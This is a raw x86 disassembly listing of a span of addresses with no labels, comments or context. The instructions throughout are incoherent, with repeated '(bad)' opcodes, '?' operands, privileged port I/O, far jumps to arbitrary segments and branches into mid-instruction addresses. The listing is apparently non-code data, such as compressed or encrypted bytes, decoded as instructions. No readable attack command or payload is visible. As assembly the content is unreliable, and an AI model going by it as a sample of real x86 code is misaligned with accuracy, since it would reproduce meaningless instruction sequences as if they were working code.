  41e76e:	lods   eax,DWORD PTR ds:[esi]
  41e76f:	mov    eax,0x4eb898d3
  41e774:	cli    
  41e775:	ins    DWORD PTR es:[edi],dx
  41e776:	adc    BYTE PTR [ecx+0x3e],dl
  41e779:	xor    eax,0xccb1094d
  41e77e:	(bad)  [ebx+ebx*8-0x2d7e7434]
  41e785:	xor    ebp,esp
  41e787:	sbb    cl,BYTE PTR [edi]
  41e789:	dec    edx
  41e78a:	adc    cl,BYTE PTR [eax+eiz*8]
  41e78d:	repz js 0x41e795
  41e790:	fst    QWORD PTR [ecx-0x23]
  41e793:	adc    edx,DWORD PTR [esi]
  41e795:	das    
  41e796:	nop
  41e797:	sbb    eax,0xb716b55
  41e79c:	clc    
  41e79d:	xor    edx,0x4b98c3a7
  41e7a3:	pop    es
  41e7a4:	push   eax
  41e7a5:	outs   dx,BYTE PTR ds:[esi]
  41e7a6:	or     DWORD PTR [ebx-0x59edda4f],edx
  41e7ac:	jno    0x41e79d
  41e7ae:	div    DWORD PTR [eax]
  41e7b0:	stos   DWORD PTR es:[edi],eax
  41e7b1:	rol    BYTE PTR [ecx],0x24
  41e7b4:	adc    DWORD PTR ss:[edx+eax*1+0xc],edx
  41e7b9:	or     eax,0xdd5386d6
  41e7be:	cmc    
  41e7bf:	das    
  41e7c0:	pop    ebx
  41e7c1:	ds push edx
  41e7c3:	jmp    0x41e83b
  41e7c5:	xor    cl,ch
  41e7c7:	cs mov eax,0x48af62fc
  41e7cd:	adc    dl,BYTE PTR [esi+0x6]
  41e7d0:	rcr    DWORD PTR [ecx-0x43],0x89
  41e7d4:	mov    al,0x3
  41e7d6:	cli    
  41e7d7:	and    esp,DWORD PTR [ecx]
  41e7d9:	cmc    
  41e7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7db:	pop    edx
  41e7dc:	daa    
  41e7dd:	cmp    DWORD PTR [eax-0x61865e3e],ecx
  41e7e3:	cmp    ebx,0x27
  41e7e6:	cmp    DWORD PTR [esp+eiz*4],eax
  41e7e9:	imul   ebx,DWORD PTR [edx+0x8],0xffffff94
  41e7ed:	mov    WORD PTR [ecx-0x55],?
  41e7f0:	adc    al,BYTE PTR [ecx]
  41e7f2:	dec    ecx
  41e7f3:	pop    esi
  41e7f4:	pop    ds
  41e7f5:	and    al,0x87
  41e7f7:	outs   dx,BYTE PTR ds:[esi]
  41e7f8:	sbb    DWORD PTR [edx],edx
  41e7fa:	mov    bl,0x7e
  41e7fc:	adc    al,0x34
  41e7fe:	adc    BYTE PTR [edi+0x6b97aea6],ah
  41e804:	cdq    
  41e805:	mov    edi,0x69218cad
  41e80a:	xchg   esp,eax
  41e80b:	lods   al,BYTE PTR ds:[esi]
  41e80c:	inc    esp
  41e80d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e80e:	aad    0xeb
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e824
  41e881:	add    DWORD PTR [ecx+0x57],ebx
  41e884:	mov    al,ds:0x4000144
  41e889:	add    DWORD PTR [eax],eax
  41e88b:	add    BYTE PTR [ebx-0xd8e8752],bl
  41e891:	lock stos BYTE PTR es:[edi],al
  41e893:	xor    edi,DWORD PTR [ebp+0x67d130d0]
  41e899:	mov    bl,0x4d
  41e89b:	mov    edx,0x55a2318e
  41e8a0:	nop
  41e8a1:	pop    edx
  41e8a2:	jno    0x41e879
  41e8a4:	(bad)  
  41e8a5:	mov    eax,ds:0x682014ea
  41e8aa:	retf   0xdea5
  41e8ad:	jo     0x41e847
  41e8af:	dec    edx
  41e8b0:	(bad)  
  41e8b1:	jns    0x41e88f
  41e8b3:	cld    
  41e8b4:	pushf  
  41e8b5:	test   al,0x15
  41e8b7:	das    
  41e8b8:	jmp    0x41e931
  41e8ba:	lods   eax,DWORD PTR ds:[esi]
  41e8bb:	xchg   edi,eax
  41e8bc:	push   esp
  41e8bd:	dec    esp
  41e8be:	or     edi,ebp
  41e8c0:	mov    ah,0xe9
  41e8c2:	inc    ecx
  41e8c3:	ret    
  41e8c4:	push   0xb4dcb77d
  41e8c9:	subps  xmm4,XMMWORD PTR [edx]
  41e8cc:	mov    eax,0x838d871
  41e8d1:	or     BYTE PTR [eax-0x5],cl
  41e8d4:	xlat   BYTE PTR ds:[ebx]
  41e8d5:	xchg   ebx,eax
  41e8d6:	shl    BYTE PTR ds:0x98c5bf79,0xa1
  41e8dd:	outs   dx,DWORD PTR ds:[esi]
  41e8de:	(bad)  
  41e8df:	cmp    eax,0x50f03200
  41e8e4:	pop    edx
  41e8e5:	inc    esp
  41e8e6:	mov    ds:0x6da06b1b,eax
  41e8eb:	leave  
  41e8ec:	daa    
  41e8ed:	mov    dh,0xe6
  41e8ef:	push   0xffffffe4
  41e8f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8f2:	imul   esi,DWORD PTR [edx+0x3ca846f6],0xf46cf81c
  41e8fc:	cmp    edi,ebp
  41e8fe:	(bad)  
  41e8ff:	sbb    esp,DWORD PTR [ebp-0x69]
  41e902:	adc    DWORD PTR [eax],eax
  41e904:	mov    bh,0xfc
  41e906:	xor    eax,0x7c91719f
  41e90b:	into   
  41e90c:	test   dl,bh
  41e90e:	stos   DWORD PTR es:[edi],eax
  41e90f:	push   ss
  41e910:	mov    esi,es
  41e912:	fadd   QWORD PTR [esi-0xb3442b9]
  41e918:	add    DWORD PTR ds:0xfe85,edi
  41e91d:	retf   
  41e91e:	mov    dh,0xac
  41e920:	adc    eax,0x1605872c
  41e925:	bound  ecx,QWORD PTR [edi+0x3f]
  41e928:	push   0x7
  41e92a:	sub    edx,DWORD PTR [ecx+ebp*1]
  41e92d:	push   edx
  41e92e:	jne    0x41e995
  41e930:	adc    edi,ebp
  41e932:	mov    gs,WORD PTR fs:[eax+ebx*1]
  41e936:	mov    dl,0x47
  41e938:	retf   
  41e939:	inc    edx
  41e93a:	xchg   esi,eax
  41e93b:	out    dx,eax
  41e93c:	inc    ebp
  41e93d:	mov    al,ds:0x1878578
  41e942:	dec    ebp
  41e943:	cli    
  41e944:	sub    eax,0xab42c0a2
  41e949:	les    edi,FWORD PTR [esi+0x34d6ae3f]
  41e94f:	scas   eax,DWORD PTR es:[edi]
  41e950:	pop    edx
  41e951:	cld    
  41e952:	or     BYTE PTR [ebp-0x4a],bl
  41e955:	and    al,0x3e
  41e957:	lea    ecx,[edx+edx*1]
  41e95a:	and    al,0x70
  41e95c:	xchg   esp,eax
  41e95d:	int    0x62
  41e95f:	sub    edx,DWORD PTR [edi+0x11]
  41e962:	in     eax,dx
  41e963:	in     eax,0xc9
  41e965:	enter  0xca63,0x6b
  41e969:	mov    bl,0xab
  41e96b:	scas   al,BYTE PTR es:[edi]
  41e96c:	rcl    esp,1
  41e96e:	popa   
  41e96f:	icebp  
  41e970:	cdq    
  41e971:	mov    ch,0xda
  41e973:	jne    0x41e96b
  41e975:	adc    eax,0x92541153
  41e97a:	adc    esi,esp
  41e97c:	sar    ah,0x39
  41e97f:	jmp    0x73f1:0xd948ba74
  41e986:	or     BYTE PTR [edx+esi*2+0x38bfc0e2],al
  41e98d:	jbe    0x41e920
  41e98f:	pop    eax
	...
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	dec    edx
  41ea01:	fidivr WORD PTR [ebx]
  41ea03:	cdq    
  41ea04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	in     al,0x7
  41ea0e:	mov    esi,edx
  41ea10:	pusha  
  41ea11:	frstor [eax-0x1d]
  41ea14:	push   0x31d1f3c1
  41ea19:	mov    BYTE PTR [ebx],cl
  41ea1b:	cmp    ch,bh
  41ea1d:	lods   al,BYTE PTR ds:[esi]
  41ea1e:	js     0x41e9bd
  41ea20:	push   esi
  41ea21:	add    al,0xf6
  41ea23:	aam    0x99
  41ea25:	jnp    0x41ea49
  41ea27:	pop    eax
  41ea28:	jmp    0xf4ba:0xfa3a1bb4
  41ea2f:	dec    esp
  41ea30:	cmp    eax,0xcbc9c02c
  41ea35:	rcl    BYTE PTR [ecx-0x22],0xc7
  41ea39:	or     eax,0x148a8e88
  41ea3e:	mov    al,ds:0x6c444614
  41ea43:	jmp    0x41ea97
  41ea45:	sub    dl,BYTE PTR [edx+0x1e20fa30]
  41ea4b:	mov    WORD PTR [ecx-0x28df6a0f],es
  41ea51:	push   esi
  41ea52:	push   ebx
  41ea53:	repz lds esp,FWORD PTR [esi-0x71f13182]
  41ea5a:	in     al,dx
  41ea5b:	int3   
  41ea5c:	cs pop ebx
  41ea5e:	jae    0x41e9ee
  41ea60:	or     al,0x2b
  41ea62:	sub    al,0x22
  41ea64:	xchg   BYTE PTR [eax+0x6c],bh
  41ea67:	mov    edx,0x759d2c65
  41ea6c:	rep stos BYTE PTR es:[edi],al
  41ea6e:	(bad)  
  41ea6f:	xor    cl,ch
  41ea71:	add    eax,0x94c76de1
  41ea76:	in     eax,0xae
  41ea78:	xor    BYTE PTR [esi+0x126fb71e],bl
  41ea7e:	mov    dh,0xbe
  41ea80:	pusha  
  41ea81:	or     edi,ecx
  41ea83:	hlt    
  41ea84:	and    BYTE PTR [ecx-0x573ce617],0xdb
  41ea8b:	mov    bh,0x67
  41ea8d:	repz adc ebp,DWORD PTR [ebx]
  41ea90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea91:	xchg   ecx,eax
  41ea92:	cmp    bl,BYTE PTR [edi]
  41ea94:	loopne 0x41ea41
  41ea96:	cmp    BYTE PTR [esi-0x7c],cl
  41ea99:	xchg   BYTE PTR [ebx+0x6aa9c635],dh
  41ea9f:	xor    BYTE PTR [edi],0xac
  41eaa2:	jle    0x41ea95
  41eaa4:	sbb    bl,bh
  41eaa6:	loopne 0x41eb24
  41eaa8:	test   al,0x91
  41eaaa:	bound  ebx,QWORD PTR [edi+0x575e1b08]
  41eab0:	mov    edi,DWORD PTR [bx]
  41eab3:	xchg   edi,eax
  41eab4:	adc    ah,ah
  41eab6:	adc    al,0xf0
  41eab8:	lock ins DWORD PTR es:[edi],dx
  41eaba:	pop    ecx
  41eabb:	fst    DWORD PTR [edx+0x57]
  41eabe:	call   0xb2ad:0x12920bdb
  41eac5:	mov    ds:0x5537e15d,eax
  41eaca:	scas   eax,DWORD PTR es:[edi]
  41eacb:	retf   
  41eacc:	add    al,0xba
  41eace:	aas    
  41eacf:	fbld   TBYTE PTR [edi-0x2f58f262]
  41ead5:	daa    
  41ead6:	shr    esi,0x8
  41ead9:	cmp    al,0x3a
  41eadb:	idiv   BYTE PTR [edi]
  41eadd:	xor    ch,BYTE PTR [esi+0x6f]
  41eae0:	sub    DWORD PTR [ebx-0x2c],edx
  41eae3:	dec    ebx
  41eae4:	ds add eax,0xc2af8e89
  41eaea:	jle    0x41eb08
  41eaec:	cmp    DWORD PTR [ebx+0x2],esi
  41eaef:	or     eax,0x29ee934a
  41eaf4:	mov    ds,WORD PTR [ebx]
  41eaf6:	cmp    eax,0xd2c556d2
  41eafb:	push   cs
  41eafc:	and    ch,bl
  41eafe:	add    eax,0xf3c8c50a
  41eb03:	gs dec edx
  41eb05:	xchg   esp,eax
  41eb06:	xchg   ecx,eax
  41eb07:	stc    
  41eb08:	mov    bl,0x91
  41eb0a:	scas   eax,DWORD PTR es:[edi]
  41eb0b:	ja     0x41eb41
  41eb0d:	xor    eax,0xa8b1
	...
  41eb72:	add    BYTE PTR [eax],al
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x51
  41eb81:	xor    eax,0x46a8193c
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	dec    edi
  41eb8d:	cmp    esp,DWORD PTR [edi-0x78be9104]
  41eb93:	leave  
  41eb94:	es (bad) 
  41eb98:	in     al,0x82
  41eb9a:	sbb    DWORD PTR [eax-0x27],esp
  41eb9d:	pop    ebx
  41eb9e:	aas    
  41eb9f:	std    
  41eba0:	test   dl,ch
  41eba2:	cmc    
  41eba3:	mov    bl,0x82
  41eba5:	sbb    eax,0x55fb81ca
  41ebaa:	jle    0x41eb98
  41ebac:	repnz rol DWORD PTR [eax],1
  41ebaf:	sub    eax,0x3abc5f59
  41ebb4:	adc    eax,0x6c1bed36
  41ebb9:	dec    eax
  41ebba:	cmp    DWORD PTR [eax-0x42762dda],ebx
  41ebc0:	lock dec edi
  41ebc2:	sub    esi,DWORD PTR [ecx+esi*4+0x6d]
  41ebc6:	pop    ss
  41ebc7:	push   0xec9330db
  41ebcc:	or     DWORD PTR [bx+si],ecx
  41ebcf:	test   BYTE PTR [ecx-0x5096a813],dl
  41ebd5:	add    eax,0xf0ef501
  41ebda:	test   al,0x74
  41ebdc:	add    al,0x49
  41ebde:	imul   edx,DWORD PTR [edi],0x49a45fb0
  41ebe4:	dec    esi
  41ebe5:	jmp    0x41ec58
  41ebe7:	xor    BYTE PTR ds:0xb14d16d6,cl
  41ebed:	xor    eax,0xc9124923
  41ebf2:	lods   al,BYTE PTR ds:[esi]
  41ebf3:	das    
  41ebf4:	mov    edx,0x1a4cd2de
  41ebf9:	mov    edx,ebx
  41ebfb:	inc    ecx
  41ebfc:	mov    ecx,0x359d576e
  41ec01:	mov    edx,0x6b2c256
  41ec06:	mov    dl,0x31
  41ec08:	sti    
  41ec09:	cmp    BYTE PTR [ebx+0x3f770853],0x5
  41ec10:	neg    BYTE PTR [edx+ebx*4-0x4006d6a2]
  41ec17:	lahf   
  41ec18:	pop    es
  41ec19:	imul   BYTE PTR [edi]
  41ec1b:	inc    esp
  41ec1c:	ins    DWORD PTR es:[edi],dx
  41ec1d:	dec    esi
  41ec1e:	mov    dl,0x14
  41ec20:	mov    bl,0x63
  41ec22:	stos   DWORD PTR es:[edi],eax
  41ec23:	and    ebp,eax
  41ec25:	cmc    
  41ec26:	adc    al,0xdb
  41ec28:	mov    edx,0xcb2d4a7a
  41ec2d:	out    0xb1,al
  41ec2f:	(bad)
  41ec33:	lock scas eax,DWORD PTR es:[edi]
  41ec35:	loope  0x41ec0e
  41ec37:	push   esi
  41ec38:	jge    0x41ec8d
  41ec3a:	mov    ah,0x68
  41ec3c:	lea    ebp,[esi-0x46]
  41ec3f:	push   esi
  41ec40:	add    cl,BYTE PTR [edi+0x1e]
  41ec43:	adc    BYTE PTR [ecx+esi*2-0x77fe09a4],dh
  41ec4a:	dec    ebx
  41ec4b:	outs   dx,DWORD PTR ds:[esi]
  41ec4c:	cmp    ebp,esp
  41ec4e:	daa    
  41ec4f:	ja     0x41ecba
  41ec51:	stc    
  41ec52:	cdq    
  41ec53:	gs icebp 
  41ec55:	sahf   
  41ec56:	out    dx,al
  41ec57:	mov    bh,0xb4
  41ec59:	jno    0x41ebeb
  41ec5b:	shl    edx,cl
  41ec5d:	aam    0x1d
  41ec5f:	xchg   BYTE PTR [ecx+0x33],al
  41ec62:	jmp    0x41ec97
  41ec64:	retf   
  41ec65:	lods   al,BYTE PTR ds:[esi]
  41ec66:	pushf  
  41ec67:	dec    edi
  41ec68:	adc    cl,BYTE PTR [edx+eiz*4-0x9]
  41ec6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec6d:	adc    al,0xe5
  41ec6f:	fisttp WORD PTR [esi]
  41ec71:	test   al,0x6b
  41ec73:	lds    edi,FWORD PTR [ebp+0xb1d9ede]
  41ec79:	imul   esi,DWORD PTR [ecx+edx*4+0x4a],0x9f38094f
  41ec81:	cmp    ebx,ebp
  41ec83:	idiv   BYTE PTR [esi]
  41ec85:	pusha  
  41ec86:	push   cs
  41ec87:	inc    esp
  41ec88:	icebp  
  41ec89:	leave  
  41ec8a:	dec    esi
  41ec8b:	cmp    BYTE PTR [ebp+0x400791],cl
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x1a155fd0
  41ed02:	hlt    
  41ed03:	add    al,0xac
  41ed05:	inc    edi
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	pushf  
  41ed0d:	adc    edi,DWORD PTR [esi+0x5e]
  41ed10:	jmp    0x41ed29
  41ed12:	cwde   
  41ed13:	push   eax
  41ed14:	aaa    
  41ed15:	daa    
  41ed16:	mov    ds:0x4332ba98,eax
  41ed1b:	es add al,0xc1
  41ed1e:	imul   esi,DWORD PTR [esi-0x75b5466d],0xffffffa8
  41ed25:	and    BYTE PTR [esi],0x96
  41ed28:	dec    eax
  41ed29:	push   edx
  41ed2a:	mov    dl,ah
  41ed2c:	test   ch,bh
  41ed2e:	nop
  41ed2f:	cli    
  41ed30:	sbb    DWORD PTR [ebp-0x41767fda],ebp
  41ed36:	jg     0x41eccd
  41ed38:	(bad)  
  41ed39:	jge    0x41ed75
  41ed3b:	out    dx,eax
  41ed3c:	repnz push ss
  41ed3e:	xor    DWORD PTR [ebp+eiz*1-0x61ee8b0a],ecx
  41ed45:	inc    ecx
  41ed46:	fst    DWORD PTR [eax+0x4de6f1e0]
  41ed4c:	push   0x35
  41ed4e:	call   0x5c84:0xffb6c652
  41ed55:	into   
  41ed56:	inc    eax
  41ed57:	loopne 0x41edb7
  41ed59:	repnz cmc 
  41ed5b:	popf   
  41ed5c:	inc    ecx
  41ed5d:	xchg   BYTE PTR [esi+eiz*8-0x2f],dl
  41ed61:	scas   al,BYTE PTR es:[edi]
  41ed62:	stos   BYTE PTR es:[edi],al
  41ed63:	popa   
  41ed64:	push   ebp
  41ed65:	or     bh,bh
  41ed67:	lock js 0x41ed39
  41ed6a:	mov    cl,0xbd
  41ed6c:	call   0xebd2:0x650586af
  41ed73:	stc    
  41ed74:	in     eax,0x7b
  41ed76:	out    0xc8,eax
  41ed78:	jg     0x41ed97
  41ed7a:	test   BYTE PTR [ecx-0x78356c12],bl
  41ed80:	mov    dl,0x56
  41ed82:	popf   
  41ed83:	clc    
  41ed84:	jb     0x41ed89
  41ed86:	bound  edi,QWORD PTR [eax]
  41ed88:	xchg   DWORD PTR [ebx+0x2d],ebp
  41ed8b:	mov    cl,BYTE PTR [ebx-0x3c3739b0]
  41ed91:	pushf  
  41ed92:	stos   DWORD PTR es:[edi],eax
  41ed93:	dec    esp
  41ed94:	pop    esi
  41ed95:	test   al,0x92
  41ed97:	xchg   ebp,eax
  41ed98:	pop    ds
  41ed99:	mov    ?,WORD PTR [edi]
  41ed9b:	in     al,0xd4
  41ed9d:	fcmovnbe st,st(4)
  41ed9f:	jns    0x41ed22
  41eda1:	jmp    0x4c7d0b63
  41eda6:	fcomp  DWORD PTR [ebp+0x74]
  41eda9:	pop    ebx
  41edaa:	jmp    0x4f81:0x9be6831d
  41edb1:	jbe    0x41ed5f
  41edb3:	daa    
  41edb4:	outs   dx,DWORD PTR ds:[esi]
  41edb5:	mov    ds:0x765a0fb4,eax
  41edba:	leave  
  41edbb:	das    
  41edbc:	jbe    0x41edbc
  41edbe:	mov    al,ds:0xd5f6b637
  41edc3:	rcl    DWORD PTR gs:[edi-0x51],cl
  41edc7:	pushf  
  41edc8:	aam    0xdd
  41edca:	add    BYTE PTR [eax],dl
  41edcc:	(bad)
  41edd0:	shl    DWORD PTR [edx+0x34],1
  41edd3:	adc    ah,BYTE PTR ds:0x4f9da71
  41edd9:	lea    edi,[ebx-0x574df716]
  41eddf:	cmp    edi,esi
  41ede1:	stc    
  41ede2:	fsub   DWORD PTR ds:0x46a0be9e
  41ede8:	add    BYTE PTR ds:0x42f7208,ah
  41edee:	retf   
  41edef:	ror    DWORD PTR [eax],1
  41edf1:	inc    ecx
  41edf2:	loopne 0x41ee6a
  41edf4:	nop
  41edf5:	loop   0x41ee4e
  41edf7:	pop    ebx
  41edf8:	fs sti 
  41edfa:	and    ah,BYTE PTR [ecx+ecx*4]
  41edfd:	loopne 0x41edb4
  41edff:	sub    eax,0x5c281512
  41ee04:	ds ja  0x41edac
  41ee07:	inc    ebx
  41ee08:	nop
  41ee09:	or     ecx,DWORD PTR [ebx+0x60d1a00b]
  41ee0f:	test   BYTE PTR [eax],al
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb053:0xfb8192e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	mov    BYTE PTR [ebx],dl
  41ee8e:	sub    BYTE PTR [ebx+0x3e],dh
  41ee91:	inc    esi
  41ee92:	scas   al,BYTE PTR es:[edi]
  41ee93:	outs   dx,BYTE PTR ds:[esi]
  41ee94:	pop    es
  41ee95:	out    0xf2,eax
  41ee97:	xchg   edi,eax
  41ee98:	dec    edi
  41ee99:	dec    ecx
  41ee9a:	mov    esi,0x795cbfab
  41ee9f:	rol    DWORD PTR [ecx-0x29],1
  41eea2:	ds adc al,0xd5
  41eea5:	add    DWORD PTR [edi+0xa],esp
  41eea8:	lods   al,BYTE PTR ds:[esi]
  41eea9:	jns    0x41ee4e
  41eeab:	loopne 0x41ee95
  41eead:	push   ecx
  41eeae:	push   0x1e666bbe
  41eeb3:	out    0xd1,al
  41eeb5:	jbe    0x41eeaf
  41eeb7:	jnp    0x41ee52
  41eeb9:	test   BYTE PTR [edi-0x53dced11],dl
  41eebf:	xor    ch,ch
  41eec1:	cs daa 
  41eec3:	adc    DWORD PTR [eax-0x7b],edx
  41eec6:	and    al,0x1a
  41eec8:	mov    ch,0x43
  41eeca:	inc    eax
  41eecb:	ror    BYTE PTR [eax+ebx*8],0xfd
  41eecf:	pop    ebx
  41eed0:	mov    eax,ds:0x8b03252
  41eed5:	jge    0x41ef36
  41eed7:	push   ss
  41eed8:	shl    BYTE PTR [eax+0x3b],1
  41eedb:	jge    0x41eee6
  41eedd:	xchg   ecx,eax
  41eede:	in     al,0xe8
  41eee0:	jmp    0x41eec4
  41eee2:	push   edx
  41eee3:	push   ss
  41eee4:	int    0x72
  41eee6:	call   0x265:0xa3131d3a
  41eeed:	inc    ebx
  41eeee:	inc    ebx
  41eeef:	mov    eax,DWORD PTR [esi]
  41eef1:	mov    ds:0x6cd5a010,eax
  41eef6:	daa    
  41eef7:	(bad)  
  41eef9:	call   FWORD PTR [esi-0x35579797]
  41eeff:	add    DWORD PTR [edx],0xf046503a
  41ef05:	fnstenv [ecx]
  41ef07:	call   0x390f:0xd99c07f
  41ef0e:	mov    dh,0xa1
  41ef10:	cmp    dh,BYTE PTR [ebx-0x6c4a6ca2]
  41ef16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef17:	push   ebx
  41ef18:	mov    bh,0x0
  41ef1a:	pop    ebp
  41ef1b:	push   cs
  41ef1c:	and    BYTE PTR [edi-0x4ecc752a],cl
  41ef22:	not    DWORD PTR [edx+0x14]
  41ef25:	dec    eax
  41ef26:	mov    BYTE PTR [esi+0x3d],cl
  41ef29:	jbe    0x41ef1d
  41ef2b:	shl    BYTE PTR [ebx+0x1b],1
  41ef2e:	imul   ecx,DWORD PTR [edx-0x33],0x6e8771f1
  41ef35:	jl     0x41ef93
  41ef37:	in     al,0x60
  41ef39:	icebp  
  41ef3a:	sub    esi,esp
  41ef3c:	jae    0x41ef69
  41ef3e:	test   DWORD PTR [esi-0x42f209de],edx
  41ef44:	std    
  41ef45:	mov    eax,0x4c6f5338
  41ef4a:	test   BYTE PTR [esi],ah
  41ef4c:	sub    ch,BYTE PTR [eax+0x3c5606b]
  41ef52:	or     esi,0x25
  41ef55:	jo     0x41ef99
  41ef57:	jns    0x41ef95
  41ef59:	fisubr DWORD PTR [ecx]
  41ef5b:	mov    WORD PTR [ebp-0x4598cc76],fs
  41ef61:	adc    ah,bl
  41ef63:	(bad)
  41ef66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef67:	cmp    eax,0xe44cb7e4
  41ef6c:	nop
  41ef6d:	test   eax,0xfee5cc0a
  41ef72:	pop    esi
  41ef73:	mov    al,ds:0x6b89c948
  41ef78:	(bad)  
  41ef79:	cmp    BYTE PTR ss:[ebx+0xe5ba090],0x79
  41ef81:	imul   edi
  41ef83:	mov    bl,ah
  41ef85:	pop    ebx
  41ef86:	or     dh,BYTE PTR [eax+0x2df6f5c2]
  41ef8c:	add    al,0x99
  41ef8e:	add    ebx,DWORD PTR [edx]
	...
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul edx,DWORD PTR [esi+0x32],0x4d
  41f003:	mov    edx,0x149b4
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	popa   
  41f00d:	xchg   edx,eax
  41f00e:	adc    eax,0x506510e8
  41f013:	call   0x61935e40
  41f018:	sahf   
  41f019:	cmc    
  41f01a:	out    dx,al
  41f01b:	les    edi,FWORD PTR [bx+di+0x74]
  41f01f:	push   edx
  41f020:	ficom  WORD PTR [ebx+edi*4+0x2c]
  41f024:	test   eax,0x7bdcd290
  41f029:	add    DWORD PTR [ebx+0x12],esp
  41f02c:	mov    ds:0xb0d25d1,al
  41f031:	mov    edx,0x7d215503
  41f036:	mov    ecx,0x3f37a313
  41f03b:	icebp  
  41f03c:	or     al,0x23
  41f03e:	pop    ds
  41f03f:	dec    ebp
  41f040:	test   DWORD PTR ds:0x88d04cb9,eax
  41f046:	(bad)  
  41f047:	mov    ds:0x5a617aaf,eax
  41f04c:	arpl   si,sp
  41f04e:	mov    eax,0x9dcdd1eb
  41f053:	mov    edi,0xa7e8f24d
  41f058:	pop    eax
  41f059:	cmp    al,0x82
  41f05b:	test   esp,0xf8321c52
  41f061:	out    0x26,al
  41f063:	cmp    DWORD PTR [ecx+0x34ae3381],0x36475374
  41f06d:	call   0xacd8:0xbcc06d6b
  41f074:	xlat   BYTE PTR ds:[ebx]
  41f075:	test   eax,0x3a1ca1b5
  41f07a:	push   eax
  41f07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f07c:	rcl    BYTE PTR ds:0xdac52017,cl
  41f082:	pop    ebp
  41f083:	ins    BYTE PTR es:[edi],dx
  41f084:	scas   eax,DWORD PTR es:[edi]
  41f085:	(bad)  
  41f086:	and    DWORD PTR [edi+eax*8-0x2689ac81],esi
  41f08d:	es (bad) 
  41f08f:	adc    al,0xa7
  41f091:	cmp    ah,bh
  41f093:	sbb    DWORD PTR [esi+0x2c],eax
  41f096:	shl    BYTE PTR [edi-0x65f5b796],cl
  41f09c:	inc    esi
  41f09d:	jb     0x41f090
  41f09f:	jns    0x41f098
  41f0a1:	lds    esi,FWORD PTR [esp+edx*4+0x1dfc94cc]
  41f0a8:	inc    ebx
  41f0a9:	imul   DWORD PTR [edx+0x3136041f]
  41f0af:	lahf   
  41f0b0:	xchg   BYTE PTR [edi+eiz*8-0x7bb29191],bh
  41f0b7:	into   
  41f0b8:	push   ebp
  41f0b9:	call   0x4263:0xcbce9c40
  41f0c0:	fmul   QWORD PTR [ebx-0x4ac638e]
  41f0c6:	shl    BYTE PTR [edi+0x9],0xac
  41f0ca:	sub    BYTE PTR [edi-0x73],ch
  41f0cd:	lods   eax,DWORD PTR ds:[esi]
  41f0ce:	jae    0x41f0c0
  41f0d0:	or     al,dl
  41f0d2:	clc    
  41f0d3:	push   edi
  41f0d4:	add    dl,BYTE PTR [esi+0x4dc51f0a]
  41f0da:	enter  0xbb00,0x9e
  41f0de:	adc    ebx,DWORD PTR [ecx+0xf]
  41f0e1:	outs   dx,DWORD PTR ds:[esi]
  41f0e2:	ret    
  41f0e3:	(bad)  
  41f0e5:	and    al,0xaa
  41f0e7:	jl     0x41f12b
  41f0e9:	out    0xce,al
  41f0eb:	mov    DWORD PTR [esi+ebx*8+0x3447af82],edi
  41f0f2:	pop    eax
  41f0f3:	in     eax,0x5
  41f0f5:	add    DWORD PTR [ebx-0x76],0xffffff8b
  41f0f9:	je     0x41f0d4
  41f0fb:	and    eax,0x48e5522a
  41f100:	push   es
  41f101:	gs jns 0x41f0b6
  41f104:	out    dx,eax
  41f105:	inc    edx
  41f106:	mov    ebx,0x8505c6e5
  41f10b:	mov    edx,0x4a3ed31f
	...
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xdd20039c
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	lods   al,BYTE PTR ds:[esi]
  41f18d:	pop    eax
  41f18e:	invd   
  41f190:	data16 fcom DWORD PTR [esi]
  41f193:	ret    0x1679
  41f196:	dec    ecx
  41f197:	jp     0x41f178
  41f199:	cs mov bl,0x7a
  41f19c:	fs std 
  41f19e:	jo     0x41f144
  41f1a0:	pop    es
  41f1a1:	dec    ebx
  41f1a2:	or     bh,dh
  41f1a4:	jae    0x41f135
  41f1a6:	push   es
